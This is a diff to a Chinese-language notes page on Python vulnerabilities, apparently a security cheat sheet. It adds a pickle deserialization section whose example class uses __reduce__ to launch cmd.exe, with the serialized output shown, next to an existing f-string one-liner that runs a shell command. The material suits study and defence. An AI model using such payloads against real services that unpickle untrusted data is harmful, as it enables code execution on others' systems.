@@ -47,7 +47,28 @@ Python漏洞
 
 python3 -c "f'''{__import__('os').system('id')}'''"
 
+反序列化
+--------------------------------
+
+pickle
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+::
+
+    >>> class A(object):
+    ...     a = 1
+    ...     b = 2
+    ...     def __reduce__(self):
+    ...         return (subprocess.Popen, (('cmd.exe',),))
+    ...
+    >>> cPickle.dumps(A())
+    "csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."
+
+PyYAML反序列化
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
 
 参考链接
 --------------------------------
 https://zhuanlan.zhihu.com/p/28823933
+http://www.91ri.org/9576.html
